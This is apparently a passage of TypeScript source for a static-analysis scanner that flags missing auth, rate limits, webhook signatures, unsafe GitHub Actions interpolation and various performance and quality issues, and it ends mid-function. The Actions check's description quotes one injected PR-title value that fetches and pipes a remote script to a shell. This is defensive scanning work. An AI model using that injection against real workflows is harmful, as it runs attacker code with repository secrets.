const MUTATING = new Set(["POST", "PUT", "PATCH", "DELETE"]);

export const AUTH_INDICATOR =
  /\b(?:getServerSession|getSession|unstable_getServerSession|auth|currentUser|clerkClient|getAuth|withAuth\w*|withApiAuth\w*|with\w*Security\w*|authenticate\w*|authorize\w*|isAuthenticated|getToken|jwtVerify|verifyJwt|verifyToken|verifyIdToken|validateRequest|validateSession|timingSafeEqual|constructEvent\w*|verifySignature|verifyWebhook\w*|(?:require|ensure|assert|check|verify|validate|get|with)(?:Auth|Authed|Authenticated|User|Session|Admin|Owner|Member|Role|Permission|Access|ApiKey|Signature|CurrentUser|Viewer|Account)\w*)\s*\(|\bsession\s*\??\.\s*user\b|\bsupabase\s*\.\s*auth\b|["'](?:authorization|x-api-key|x-cron-secret|x-webhook-secret)["']|\b(?:CRON_SECRET|INTERNAL_API_KEY|API_SECRET|ADMIN_TOKEN|SERVICE_TOKEN)\b/i;

export const RATE_LIMIT_INDICATOR =
  /rate.?limit|ratelimit|limiter|throttl|slidingWindow|fixedWindow|tokenBucket|consumeUsageBudget|checkUsage|usage.?budget|\bquota\b|arcjet|\bwith\w*(?:Security|Protect\w*|Guard)\s*\(/i;

export const PUBLIC_ROUTE =
  /\/(?:auth|login|logout|signin|sign-in|signout|register|signup|sign-up|forgot|reset|verify|callback|oauth|webhooks?|health|healthz|status|ping|public|og|opengraph|sitemap|robots|cron|trpc|inngest|unsubscribe|track|beacon|contact|newsletter|waitlist|subscribe|feedback|invite|share|embed|badge|rss|feed)\b/i;

const SENSITIVE_ROUTE =
  /\/(?:auth|login|signin|sign-in|register|signup|sign-up|forgot|reset|verify|otp|2fa|mfa|password|invite|contact|feedback|newsletter|waitlist|subscribe|email|chat|completions?|generate|llm|upload|payments?|checkout|billing|sms)\b/i;

export const SENSITIVE_CALL =
  /\b(?:sendMail|sendEmail|send\w*Email|resend\s*\.\s*emails|transporter\s*\.\s*sendMail|openai|anthropic|messages\s*\.\s*create|chat\s*\.\s*completions|generateText|streamText|callAI|bcrypt\s*\.\s*(?:compare|hash)|argon2\s*\.\s*(?:verify|hash)|stripe\s*\.\s*(?:charges|paymentIntents|checkout))\b/i;

export function routePath(filename: string): string {
  const m = /(?:^|\/)(?:src\/)?(?:app|pages)\/(.*?)(?:\/route|\/index)?\.[jt]sx?$/.exec(filename);
  if (!m) return filename;
  return `/${m[1].split("/").filter((seg) => !/^\(.*\)$/.test(seg)).join("/")}`;
}

export interface Handler {
  method: string;
  offset: number;
  bodyText: string;
  path: string;
}

export function findHandlers(ctx: FileCtx): Handler[] {
  if (ctx.isClient) return [];
  const out: Handler[] = [];
  const route = routePath(ctx.filename);
  for (const m of ctx.code.matchAll(/export\s+(?:async\s+)?function\s+(GET|POST|PUT|PATCH|DELETE)\b|export\s+const\s+(GET|POST|PUT|PATCH|DELETE)\s*(?::[^=]+)?=/g)) {
    const after = m.index + m[0].length;
    let start = after;
    let end: number;
    if (m[1]) {
      const body = functionBodyAfter(ctx.code, after);
      if (!body) continue;
      start = body.start;
      end = body.end;
    } else {
      end = statementEnd(ctx.code, after);
    }
    out.push({ method: m[1] ?? m[2], offset: m.index, bodyText: ctx.text.slice(start, end), path: route });
  }
  for (const m of ctx.code.matchAll(/\b(?:app|router|server|routes?)\s*\.\s*(get|post|put|patch|delete)\s*\(/g)) {
    const call = callArgsAt(ctx.code, m.index + m[0].length - 1);
    if (!call || call.args.length < 2) continue;
    const argsCode = ctx.code.slice(call.open + 1, call.close);
    if (!/=>|\bfunction\b/.test(argsCode)) continue;
    const first = call.args[0];
    const path = ctx.text.slice(first.start, first.start + first.text.length).trim().replace(/^["'`]|["'`]$/g, "");
    out.push({ method: m[1].toUpperCase(), offset: m.index, bodyText: ctx.text.slice(call.open + 1, call.close), path });
  }
  return out;
}

function finding(ctx: FileCtx, offset: number, f: Omit<CheckFinding, "offset">): CheckFinding {
  return { ...f, offset };
}

const routeAuthCheck: StructuralCheck = {
  id: "api-route-no-auth",
  langs: ["js"],
  run: (ctx) => {
    if (AUTH_INDICATOR.test(ctx.text)) return [];
    const global = ctx.project.globalAuth;
    return findHandlers(ctx)
      .filter((h) => MUTATING.has(h.method) && !PUBLIC_ROUTE.test(h.path) && !PUBLIC_ROUTE.test(ctx.filename))
      .map((h) =>
        finding(ctx, h.offset, {
          ruleId: "api-route-no-auth",
          cls: "authz",
          category: "security",
          severity: global ? "low" : "medium",
          confidence: global ? 0.5 : 0.7,
          description: `${h.method} handler for \`${h.path}\` in ${ctx.short} mutates state without any visible authentication or authorization check${global ? ". A global proxy/middleware auth check exists, but Next.js recommends verifying the session in the handler too — proxies are skipped by matcher gaps and direct invocations" : ""}.`,
          suggestion: "Check the session at the top of the handler and scope every query to the caller: const session = await getServerSession(authOptions); if (!session?.user) return Response.json({ error: \"Unauthorized\" }, { status: 401 });",
          fix: {
            before: "export async function POST(req: Request) {\n  const body = await req.json();\n  await db.item.update({ where: { id: body.id }, data: body });\n}",
            after: "export async function POST(req: Request) {\n  const session = await getServerSession(authOptions);\n  if (!session?.user?.id) return Response.json({ error: \"Unauthorized\" }, { status: 401 });\n  const body = Schema.parse(await req.json());\n  await db.item.update({ where: { id: body.id, ownerId: session.user.id }, data: { name: body.name } });\n}",
            language: "typescript",
          },
        }),
      );
  },
};

const rateLimitCheck: StructuralCheck = {
  id: "missing-rate-limit",
  langs: ["js"],
  run: (ctx) => {
    if (ctx.project.globalRateLimit || RATE_LIMIT_INDICATOR.test(ctx.text)) return [];
    const authenticated = AUTH_INDICATOR.test(ctx.text);
    return findHandlers(ctx)
      .filter((h) => MUTATING.has(h.method) && !/\/admin\//.test(h.path) && (SENSITIVE_ROUTE.test(h.path) || SENSITIVE_CALL.test(h.bodyText)))
      .map((h) =>
        finding(ctx, h.offset, {
          ruleId: "missing-rate-limit",
          category: "security",
          severity: authenticated ? "low" : "medium",
          confidence: authenticated ? 0.55 : 0.7,
          description: authenticated
            ? `${h.method} \`${h.path}\` in ${ctx.short} triggers an expensive or abusable operation (email, AI or payment call) with no per-user rate limit. A single account can spam recipients or run up provider bills.`
            : `${h.method} \`${h.path}\` in ${ctx.short} is unauthenticated and performs an abusable operation (credential check, email, AI or payment call) with no rate limiting. Attackers can brute-force credentials, spam email, or run up provider bills.`,
          suggestion: "Rate limit per user and per IP before doing work, e.g. @upstash/ratelimit slidingWindow(10, \"1 m\"), returning 429 when exceeded.",
          fix: {
            before: "export async function POST(req: Request) {\n  const { email } = await req.json();\n  await sendResetEmail(email);\n}",
            after: "const limiter = new Ratelimit({ redis: Redis.fromEnv(), limiter: Ratelimit.slidingWindow(5, \"10 m\") });\n\nexport async function POST(req: Request) {\n  const ip = req.headers.get(\"x-forwarded-for\") ?? \"anon\";\n  if (!(await limiter.limit(ip)).success) return Response.json({ error: \"Too many requests\" }, { status: 429 });\n  const { email } = await req.json();\n  await sendResetEmail(email);\n}",
            language: "typescript",
          },
        }),
      );
  },
};

const USE_SERVER_FILE = /^(?:\s|\/\/[^\n]*\n|\/\*[\s\S]*?\*\/)*["']use server["']/;

const serverActionAuthCheck: StructuralCheck = {
  id: "nextjs-server-action-no-auth",
  langs: ["js"],
  run: (ctx) => {
    if (!USE_SERVER_FILE.test(ctx.raw) || AUTH_INDICATOR.test(ctx.text)) return [];
    return [...ctx.code.matchAll(/export\s+(?:default\s+)?async\s+function\s+(\w+)/g)].map((m) =>
      finding(ctx, m.index, {
        ruleId: "nextjs-server-action-no-auth",
        cls: "authz",
        category: "security",
        severity: "medium",
        confidence: 0.6,
        description: `Server action \`${m[1]}\` in ${ctx.short} has no authentication check. Every exported server action is a public POST endpoint that anyone can call directly, regardless of which page renders it.`,
        suggestion: "Verify the session inside every server action and never trust ids passed from the client: const session = await auth(); if (!session) throw new Error(\"Unauthorized\");",
      }),
    );
  },
};

export const WEBHOOK_VERIFY =
  /signature|verify|constructEvent|createHmac|\bhmac\b|timingSafeEqual|svix|new\s+Webhook\s*\(|webhook_?secret|x-hub-signature|stripe-signature/i;

const webhookCheck: StructuralCheck = {
  id: "webhook-no-signature",
  langs: ["js"],
  files: /(?:^|\/)webhooks?(?:\/|\.[jt]s$)/i,
  run: (ctx) => {
    if (WEBHOOK_VERIFY.test(ctx.text) || AUTH_INDICATOR.test(ctx.text)) return [];
    return findHandlers(ctx)
      .filter((h) => h.method === "POST")
      .map((h) =>
        finding(ctx, h.offset, {
          ruleId: "webhook-no-signature",
          cls: "authz",
          category: "security",
          severity: "high",
          confidence: 0.75,
          description: `Webhook endpoint in ${ctx.short} processes events without verifying a signature. Anyone who finds the URL can forge events (fake payments, fake pushes, fake sign-ups).`,
          suggestion: "Verify the provider's signature over the raw body with a constant-time comparison before parsing (stripe.webhooks.constructEvent, svix Webhook.verify, GitHub X-Hub-Signature-256 HMAC).",
        }),
      );
  },
};

export const CRON_AUTH = /CRON_SECRET|authorization|x-vercel-cron|verifySignature|Receiver|qstash|cron[_-]?secret|isVercelCron|INTERNAL_\w*(?:SECRET|KEY|TOKEN)/i;

const cronCheck: StructuralCheck = {
  id: "cron-no-secret",
  langs: ["js"],
  files: /cron/i,
  run: (ctx) => {
    if (CRON_AUTH.test(ctx.text)) return [];
    return findHandlers(ctx).map((h) =>
      finding(ctx, h.offset, {
        ruleId: "cron-no-secret",
        cls: "authz",
        category: "security",
        severity: "medium",
        confidence: 0.7,
        description: `Cron endpoint in ${ctx.short} does not check a shared secret. Anyone can trigger the job repeatedly.`,
        suggestion: "Require the scheduler's secret: if (req.headers.get(\"authorization\") !== `Bearer ${process.env.CRON_SECRET}`) return new Response(null, { status: 401 });",
      }),
    );
  },
};

const paginationCheck: StructuralCheck = {
  id: "missing-pagination",
  langs: ["js"],
  run: (ctx) => {
    if (/(?:^|\/)(?:scripts?|seed|migrations?|prisma)\//i.test(ctx.filename)) return [];
    const out: CheckFinding[] = [];
    for (const m of ctx.code.matchAll(/\b(?:prisma|db|tx|this\s*\.\s*(?:prisma|db)|ctx\s*\.\s*(?:prisma|db))\s*\.\s*(\w+)\s*\.\s*findMany\s*\(|\.\s*findAll\s*\(/g)) {
      const call = callArgsAt(ctx.code, m.index + m[0].length - 1);
      if (!call) continue;
      const args = ctx.code.slice(call.open + 1, call.close);
      if (/\b(?:take|first|limit|cursor)\b/.test(args)) continue;
      const scoped = /\bwhere\b/.test(args);
      out.push(
        finding(ctx, m.index, {
          ruleId: "missing-pagination",
          category: "performance",
          severity: scoped ? "low" : "medium",
          confidence: scoped ? 0.55 : 0.7,
          description: `Unbounded ${m[1] ? `\`${m[1]}.findMany()\`` : "findAll()"} in ${ctx.short}${scoped ? " (filtered, but with no row limit)" : ""}. Result size grows with the table — memory, latency and payload size grow with it.`,
          label: "List queries without a row limit (take/limit)",
          suggestion: "Add take (and cursor/skip for paging): prisma.post.findMany({ where, take: 50, cursor: lastId ? { id: lastId } : undefined, orderBy: { id: \"asc\" } }).",
        }),
      );
    }
    return out;
  },
};

const DB_CALL =
  /\b(?:prisma|db|tx|knex|supabase)\s*\.\s*\w+(?:\s*\.\s*\w+)?\s*\(|\b\w+(?:Model|Repository|Repo)\s*\.\s*\w+\s*\(|\.\s*(?:findOne|findById|findUnique|findUniqueOrThrow|findFirst|findMany|findAll)\s*\(/;

interface Loop {
  offset: number;
  body: string;
  parallel: boolean;
  forAwait: boolean;
}

function loopsIn(code: string): Loop[] {
  const out: Loop[] = [];
  for (const m of code.matchAll(/\bfor\s*(await\s*)?\(|\bwhile\s*\(|\.\s*(?:forEach|map|flatMap)\s*\(/g)) {
    const paren = m.index + m[0].length - 1;
    if (m[0].startsWith(".")) {
      const call = callArgsAt(code, paren);
      if (!call || call.args.length === 0) continue;
      const before = code.slice(Math.max(0, m.index - 120), m.index);
      if (/\$transaction\s*\(\s*\[?[^;]*$/.test(before)) continue;
      out.push({ offset: m.index, body: call.args[0].text, parallel: !/forEach/.test(m[0]), forAwait: false });
      continue;
    }
    const close = findClose(code, paren);
    if (close < 0) continue;
    const next = /^\s*\{/.exec(code.slice(close + 1, close + 40));
    const bodyEnd = next ? findClose(code, close + next[0].length) : statementEnd(code, close + 1);
    if (bodyEnd < 0) continue;
    out.push({ offset: m.index, body: code.slice(close + 1, bodyEnd), parallel: false, forAwait: !!m[1] });
  }
  return out;
}

const nPlusOneCheck: StructuralCheck = {
  id: "n-plus-one-query",
  langs: ["js"],
  run: (ctx) =>
    loopsIn(ctx.code)
      .filter((l) => DB_CALL.test(l.body) && (l.parallel || /\bawait\b/.test(l.body)))
      .map((l) =>
        finding(ctx, l.offset, {
          ruleId: "n-plus-one-query",
          category: "performance",
          severity: l.parallel ? "medium" : "high",
          confidence: 0.75,
          description: l.parallel
            ? `Database query issued per element inside .map() in ${ctx.short}. N items fire N queries at once — connection-pool pressure and N round-trips of load.`
            : `N+1 query: database call awaited inside a loop in ${ctx.short}. N items cost N sequential round-trips, so latency grows linearly with data size.`,
          label: "N+1 queries — database calls inside loops",
          suggestion: "Fetch in one query (findMany({ where: { id: { in: ids } } }) or include/join), then map in memory. For writes use createMany/updateMany or a single $transaction.",
          fix: {
            before: "for (const post of posts) {\n  post.author = await prisma.user.findUnique({ where: { id: post.authorId } });\n}",
            after: "const authors = await prisma.user.findMany({ where: { id: { in: posts.map((p) => p.authorId) } } });\nconst byId = new Map(authors.map((a) => [a.id, a]));\nfor (const post of posts) post.author = byId.get(post.authorId);",
            language: "typescript",
          },
        }),
      ),
};

const pyNPlusOneCheck: StructuralCheck = {
  id: "n-plus-one-query",
  langs: ["py"],
  run: (ctx) => {
    const out: CheckFinding[] = [];
    for (const m of ctx.code.matchAll(/^([ \t]*)for\s+[^\n]+:[ \t]*$/gm)) {
      const indent = m[1].length;
      const rest = ctx.code.slice(m.index + m[0].length + 1);
      const bodyLines: string[] = [];
      for (const line of rest.split("\n")) {
        if (line.trim() === "") { bodyLines.push(line); continue; }
        if (line.search(/\S/) <= indent) break;
        bodyLines.push(line);
        if (bodyLines.length > 80) break;
      }
      const body = bodyLines.join("\n");
      if (!/\.objects\s*\.\s*(?:get|filter|create)\s*\(|\bsession\s*\.\s*(?:query|get|execute)\s*\(|\.\s*execute\s*\(|\bcursor\s*\./.test(body)) continue;
      out.push(
        finding(ctx, m.index + indent, {
          ruleId: "n-plus-one-query",
          category: "performance",
          severity: "high",
          confidence: 0.7,
          description: `Database query inside a loop in ${ctx.short} (N+1). Each iteration costs a round-trip.`,
          label: "N+1 queries — database calls inside loops",
          suggestion: "Batch the lookup (filter(id__in=ids), select_related/prefetch_related, or a single IN query) and map results in memory.",
        }),
      );
    }
    return out;
  },
};

const awaitInLoopCheck: StructuralCheck = {
  id: "no-await-in-loop",
  langs: ["js"],
  run: (ctx) =>
    loopsIn(ctx.code)
      .filter((l) => !l.parallel && !l.forAwait && /\bawait\b/.test(l.body) && !DB_CALL.test(l.body))
      .map((l) =>
        finding(ctx, l.offset, {
          ruleId: "no-await-in-loop",
          category: "quality",
          severity: "low",
          confidence: 0.6,
          description: `\`await\` inside a loop in ${ctx.short} runs iterations one after another. If they are independent, this is avoidable latency.`,
          label: "await inside loops serializes independent work",
          suggestion: "If iterations don't depend on each other: await Promise.all(items.map(fn)). Keep the loop when order or rate limiting matters.",
        }),
      ),
};

const asyncNoAwaitCheck: StructuralCheck = {
  id: "async-no-await",
  langs: ["js"],
  run: (ctx) => {
    if (USE_SERVER_FILE.test(ctx.raw)) return [];
    const out: CheckFinding[] = [];
    for (const m of ctx.code.matchAll(/\basync\s+function\s*(\*?)\s*(\w*)\s*\(|\basync\s*(?:\([^()]*\)|[A-Za-z_$][\w$]*)\s*(?::[^=;{]{1,80})?=>\s*\{/g)) {
      if (m[1] === "*") continue;
      if (/^(?:GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS|generateMetadata|generateStaticParams|middleware|proxy|default)$/.test(m[2] ?? "")) continue;
      if (/export\s+default\s+$/.test(ctx.code.slice(Math.max(0, m.index - 20), m.index))) continue;
      let body: { start: number; end: number } | null;
      if (m[0].startsWith("async function")) body = functionBodyAfter(ctx.code, m.index + m[0].length - 1);
      else {
        const open = m.index + m[0].length - 1;
        const close = findClose(ctx.code, open);
        body = close < 0 ? null : { start: open, end: close };
      }
      if (!body) continue;
      const text = ctx.code.slice(body.start + 1, body.end);
      if (/\bawait\b|\byield\b/.test(text) || text.trim().length < 3) continue;
      if (/\breturn\s+(?:new\s+Promise|[\w.]+\s*\()/.test(text)) continue;
      out.push(
        finding(ctx, m.index, {
          ruleId: "async-no-await",
          category: "quality",
          severity: "low",
          confidence: 0.55,
          description: `\`async\` function${m[2] ? ` \`${m[2]}\`` : ""} in ${ctx.short} never awaits. It wraps every return value (and thrown error) in a promise for no reason — callers must await it, and synchronous throws become rejections.`,
          label: "async functions that never await",
          suggestion: "Drop the async keyword, or add the missing await if a promise is being returned unhandled.",
        }),
      );
    }
    return out;
  },
};

const switchCheck: StructuralCheck = {
  id: "switch-statements",
  langs: ["js", "java", "cs", "go", "php"],
  run: (ctx) => {
    const out: CheckFinding[] = [];
    for (const m of ctx.code.matchAll(/\bswitch\s*\(/g)) {
      const pclose = findClose(ctx.code, m.index + m[0].length - 1);
      if (pclose < 0) continue;
      const brace = /^\s*\{/.exec(ctx.code.slice(pclose + 1, pclose + 20));
      if (!brace) continue;
      const open = pclose + brace[0].length;
      const close = findClose(ctx.code, open);
      if (close < 0) continue;

      const labels: Array<{ start: number; end: number; isDefault: boolean }> = [];
      let depth = 0;
      for (let i = open + 1; i < close; i++) {
        const ch = ctx.code[i];
        if (ch === "{" || ch === "(" || ch === "[") depth++;
        else if (ch === "}" || ch === ")" || ch === "]") depth--;
        else if (depth === 0 && /\w/.test(ch) && !/\w/.test(ctx.code[i - 1])) {
          const label = /^(case\b[^:]*?|default\s*):(?!:)/.exec(ctx.code.slice(i, i + 200));
          if (label) {
            labels.push({ start: i, end: i + label[0].length, isDefault: label[1].startsWith("default") });
            i += label[0].length - 1;
          }
        }
      }
      if (labels.length === 0) continue;

      if (ctx.lang !== "go") {
        for (let k = 0; k < labels.length - 1; k++) {
          const seg = ctx.code.slice(labels[k].end, labels[k + 1].start);
          if (seg.trim() === "") continue;
          if (/\b(?:break|return|throw|continue|exit|die|goto)\b|process\s*\.\s*exit|\bnever\b/.test(seg)) continue;
          if (/falls?\s*-?through|fallthrough|no\s*break/i.test(ctx.raw.slice(labels[k].end, labels[k + 1].start + 40))) continue;
          out.push(
            finding(ctx, labels[k].start, {
              ruleId: "switch-fallthrough",
              category: "quality",
              severity: "medium",
              confidence: 0.75,
              description: `\`${ctx.code.slice(labels[k].start, labels[k].end).trim()}\` falls through into the next case in ${ctx.short} without a break, return or "falls through" comment.`,
              label: "Switch cases that fall through without break",
              suggestion: "End the case with break/return/throw, or add a `// falls through` comment if it is intentional.",
            }),
          );
        }
      }
      const after = ctx.code.slice(close + 1, close + 200);
      if (!labels.some((l) => l.isDefault) && !/^\s*(?:return|throw)\b/.test(after) && ctx.lang !== "go") {
        out.push(
          finding(ctx, m.index, {
            ruleId: "switch-no-default",
            category: "quality",
            severity: "low",
            confidence: 0.5,
            description: `switch without a default branch in ${ctx.short}. New values are silently ignored.`,
            label: "switch statements without a default branch",
            suggestion: "Add default: throw new Error(`Unhandled value: ${value}`) — or, in TypeScript, an exhaustive `const _exhaustive: never = value` check.",
          }),
        );
      }
    }
    return out;
  },
};

function statementStart(code: string, idx: number): { start: number; nested: boolean } {
  let depth = 0;
  for (let j = idx - 1; j >= Math.max(0, idx - 3000); j--) {
    const ch = code[j];
    if (ch === ")" || ch === "]" || ch === "}") depth++;
    else if (ch === "(" || ch === "[" || ch === "{") {
      if (depth === 0) return { start: j + 1, nested: ch !== "{" };
      depth--;
    } else if (depth === 0 && ch === ";") return { start: j + 1, nested: false };
    else if (depth === 0 && ch === "\n") {
      const nextLine = code.slice(j + 1, j + 60);
      const prevLine = code.slice(Math.max(0, j - 80), j).trimEnd();
      if (!/^\s*[.?]/.test(nextLine) && !/[=(,:?&|+]$|=>$|\b(?:return|await)$/.test(prevLine)) return { start: j + 1, nested: false };
    }
  }
  return { start: Math.max(0, idx - 3000), nested: false };
}

const CONSUMED_PREFIX = /^(?:return|await|yield|void|throw|export)\b|^(?:const|let|var)\s|^[\w$.[\]]+\s*(?:=|\?\?=|\|\|=)(?!=)/;

const promiseCatchCheck: StructuralCheck = {
  id: "promise-no-catch",
  langs: ["js"],
  run: (ctx) => {
    const out: CheckFinding[] = [];
    const seenStatements = new Set<number>();
    for (const m of ctx.code.matchAll(/\.\s*then\s*\(/g)) {
      const call = callArgsAt(ctx.code, m.index + m[0].length - 1);
      if (!call || call.args.length >= 2) continue;
      let i = call.close + 1;
      let handled = false;
      for (let hop = 0; hop < 10; hop++) {
        const link = /^\s*\.\s*(then|catch|finally)\s*\(/.exec(ctx.code.slice(i, i + 40));
        if (!link) break;
        if (link[1] === "catch") handled = true;
        const c = findClose(ctx.code, i + link[0].length - 1);
        if (c < 0) break;
        i = c + 1;
      }
      if (handled) continue;
      const st = statementStart(ctx.code, m.index);
      if (st.nested || seenStatements.has(st.start)) continue;
      seenStatements.add(st.start);
      if (CONSUMED_PREFIX.test(ctx.code.slice(st.start, m.index).trim())) continue;
      out.push(
        finding(ctx, m.index, {
          ruleId: "promise-no-catch",
          category: "quality",
          severity: "medium",
          confidence: 0.65,
          description: `Promise chain with .then() but no .catch() in ${ctx.short}. A rejection becomes an unhandled rejection — silent in browsers, a crash in Node.`,
          label: "Promise chains without .catch()",
          suggestion: "Append .catch(err => …) or convert to async/await inside try/catch.",
        }),
      );
    }
    return out;
  },
};

const floatingPromiseCheck: StructuralCheck = {
  id: "floating-promise",
  langs: ["js"],
  run: (ctx) => {
    const out: CheckFinding[] = [];
    const re =
      /^[ \t]*(fetch|prisma\s*\.\s*\w+\s*\.\s*\w+|db\s*\.\s*\w+(?:\s*\.\s*\w+)?|send\w*(?:Email|Mail|Sms|SMS|Notification|Webhook)\w*|\w+\s*\.\s*emails\s*\.\s*send|transporter\s*\.\s*sendMail)\s*\(/gm;
    for (const m of ctx.code.matchAll(re)) {
      const call = callArgsAt(ctx.code, m.index + m[0].length - 1);
      if (!call) continue;
      if (/^\s*\./.test(ctx.code.slice(call.close + 1, call.close + 40))) continue;
      const prev = ctx.code.slice(Math.max(0, m.index - 600), m.index).trimEnd();
      if (/[=(,:?&|+[]$|=>$|\b(?:return|await|void)$/.test(prev)) continue;
      out.push(
        finding(ctx, m.index, {
          ruleId: "floating-promise",
          category: "quality",
          severity: "medium",
          confidence: 0.7,
          description: `\`${m[1].replace(/\s+/g, "")}()\` is called without await, return or .catch() in ${ctx.short}. Errors vanish, and in serverless runtimes the work may be cut off when the response is sent.`,
          label: "Floating promises — async calls neither awaited nor handled",
          suggestion: "await the call, or for deliberate fire-and-forget: void task().catch((err) => log.error(err)) (and use waitUntil/after() on serverless).",
        }),
      );
    }
    return out;
  },
};

const missingKeyCheck: StructuralCheck = {
  id: "missing-key-prop",
  langs: ["js"],
  files: /\.(?:jsx|tsx)$/,
  run: (ctx) => {
    const out: CheckFinding[] = [];
    for (const m of ctx.code.matchAll(/\.\s*map\s*\(/g)) {
      const call = callArgsAt(ctx.code, m.index + m[0].length - 1);
      if (!call || call.args.length === 0) continue;
      const cb = call.args[0];
      const jsx = /(?:=>\s*\(?\s*|\breturn\s*\(?\s*)<([A-Za-z][\w.]*|>)/.exec(cb.text);
      if (!jsx) continue;
      let missing: boolean;
      if (jsx[1] === ">") missing = true;
      else {
        let i = cb.start + jsx.index + jsx[0].length;
        let depth = 0;
        const stop = Math.min(ctx.code.length, i + 2000);
        for (; i < stop; i++) {
          const ch = ctx.code[i];
          if (ch === "{") depth++;
          else if (ch === "}") depth--;
          else if (ch === ">" && depth === 0) break;
        }
        const attrs = ctx.code.slice(cb.start + jsx.index + jsx[0].length, i);
        missing = !/\bkey\s*=/.test(attrs) && !/\{\s*\.\.\./.test(attrs);
      }
      if (!missing) continue;
      out.push(
        finding(ctx, m.index, {
          ruleId: "missing-key-prop",
          category: "quality",
          severity: "medium",
          confidence: 0.75,
          description: `List rendered with .map() without a \`key\` on the returned element in ${ctx.short}${jsx[1] === ">" ? " (a <></> fragment cannot take a key — use <Fragment key={…}>)" : ""}. React can't track items, so state and DOM get attached to the wrong rows when the list changes.`,
          label: "React list renders without stable key props",
          suggestion: "Add a stable unique key from the data: items.map((item) => <Row key={item.id} … />).",
        }),
      );
    }
    return out;
  },
};

const dockerRootCheck: StructuralCheck = {
  id: "docker-root-user",
  langs: ["docker"],
  run: (ctx) => {
    const froms = [...ctx.code.matchAll(/^[ \t]*FROM\s+(?:--platform=\S+\s+)?(\S+)/gim)];
    const last = froms.at(-1);
    if (!last || /distroless|chainguard|nonroot|rootless|^scratch$/i.test(last[1])) return [];
    const users = [...ctx.code.slice(last.index).matchAll(/^[ \t]*USER\s+(\S+)/gim)];
    const user = users.at(-1)?.[1];
    if (user && !/^(?:root|0)(?::|$)/.test(user)) return [];
    return [
      finding(ctx, last.index, {
        ruleId: "docker-root-user",
        category: "security",
        severity: "medium",
        confidence: 0.75,
        description: `Final image stage in ${ctx.short} runs as root (${user ? "USER root" : "no USER instruction"}). A container breakout or RCE then lands with root privileges.`,
        suggestion: "Add a non-root user and switch to it before CMD (official Node images ship `USER node`).",
        fix: {
          before: 'FROM node:22-alpine\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]',
          after: 'FROM node:22-alpine\nWORKDIR /app\nCOPY --chown=node:node . .\nUSER node\nCMD ["node", "server.js"]',
          language: "docker",
        },
      }),
    ];
  },
};

const GHA_DANGEROUS_CONTEXT =
  /\$\{\{\s*(github\.head_ref|github\.event\.(?:issue|pull_request|discussion)\.(?:title|body)|github\.event\.(?:comment|review|review_comment|discussion_comment)\.body|github\.event\.(?:workflow_run\.)?head_commit\.(?:message|author\.(?:email|name))|github\.event\.commits[^}]*?\.(?:message|author\.(?:email|name))|github\.event\.pull_request\.head\.(?:ref|label|repo\.default_branch)|github\.event\.workflow_run\.head_branch|github\.event\.pages[^}]*?\.page_name)\s*\}\}/;

const actionsCheck: StructuralCheck = {
  id: "github-actions",
  langs: ["yaml"],
  files: WORKFLOW_FILE,
  run: (ctx) => {
    const out: CheckFinding[] = [];
    if (/\bpull_request_target\b/.test(ctx.code)) {
      for (const m of ctx.code.matchAll(/^\s*ref\s*:\s*["']?\$\{\{\s*(?:github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref)\s*\}\}/gm)) {
        out.push(
          finding(ctx, m.index, {
            ruleId: "gha-pwn-request",
            category: "security",
            severity: "critical",
            confidence: 0.9,
            description: `\`pull_request_target\` workflow checks out the pull request's code in ${ctx.short}. The job has repository secrets and a write token, so any fork can run arbitrary code with them ("pwn request").`,
            suggestion: "Use the pull_request trigger for building untrusted code. If you need pull_request_target, never check out or execute the PR head — or split into a privileged workflow_run that only consumes artifacts.",
          }),
        );
      }
    }
    let runIndent = -1;
    let offset = 0;
    for (const line of ctx.code.split("\n")) {
      const indent = line.search(/\S/);
      if (runIndent >= 0 && indent >= 0 && indent <= runIndent) runIndent = -1;
      const runKey = /^(\s*)(-\s+)?run\s*:\s*(.*)$/.exec(line);
      let content: string | null = null;
      if (runKey) {
        if (/^[|>][-+]?\s*$/.test(runKey[3])) runIndent = runKey[1].length + (runKey[2]?.length ?? 0);
        else content = runKey[3];
      } else if (runIndent >= 0) {
        content = line;
      }
      const hit = content ? GHA_DANGEROUS_CONTEXT.exec(content) : null;
      if (hit) {
        out.push(
          finding(ctx, offset + line.indexOf(hit[0]), {
            ruleId: "gha-script-injection",
            category: "security",
            severity: "high",
            confidence: 0.85,
            description: `Attacker-controlled \`${hit[1]}\` is interpolated directly into a run: script in ${ctx.short}. A PR title or branch name like \`"; curl evil.sh | sh #\` executes in the runner with the workflow's secrets.`,
            suggestion: "Pass the value through an environment variable and quote it: env: TITLE: ${{ github.event.pull_request.title }} then run: echo \"$TITLE\".",
            fix: {
              before: 'run: echo "${{ github.event.pull_request.title }}"',
              after: 'env:\n  PR_TITLE: ${{ github.event.pull_request.title }}\nrun: echo "$PR_TITLE"',
              language: "yaml",
            },
          }),
        );
      }
      offset += line.length + 1;
    }
    return out;
  },
};

const goDeferLoopCheck: StructuralCheck = {
  id: "go-defer-in-loop",
  langs: ["go"],
  run: (ctx) => {
    const out: CheckFinding[] = [];
    for (const m of ctx.code.matchAll(/\bfor\b[^{\n]*\{/g)) {
      const close = findClose(ctx.code, m.index + m[0].length - 1);
      if (close < 0) continue;
      const body = ctx.code.slice(m.index + m[0].length, close);
      if (!/\bdefer\b/.test(body) || /\bfunc\s*\(/.test(body)) continue;
      out.push(
        finding(ctx, m.index, {
          ruleId: "go-defer-in-loop",
          category: "quality",
          severity: "medium",
          confidence: 0.75,
          description: `defer inside a loop in ${ctx.short}. Deferred calls run only when the function returns, so files/locks/rows from every iteration stay open until then.`,
          label: "defer inside loops holds resources until the function returns",
          suggestion: "Move the loop body into a helper function (or a closure) so each iteration's defer runs at the end of that iteration.",
        }),
      );
    }
    return out;
  },
};

const testAssertionCheck: StructuralCheck = {
  id: "test-without-assertion",
  langs: ["js"],
  roles: ["test"],
  run: (ctx) => {
    const out: CheckFinding[] = [];
    for (const m of ctx.code.matchAll(/(?<![.\w$])(?:it|test)\s*\(/g)) {
      const call = callArgsAt(ctx.code, m.index + m[0].length - 1);
      if (!call || call.args.length < 2) continue;
      const fn = call.args[call.args.length - 1].text;
      if (fn.trim().length < 10) continue;
      if (/\b(?:expect|assert\w*|should|expectTypeOf|verify\w*|toMatch\w*|cy|page|screen\s*\.\s*getBy)\b|\bt\s*\.\s*(?:is|true|false|deepEqual|equal|throws|snapshot|assert)\b/.test(fn)) continue;
      out.push(
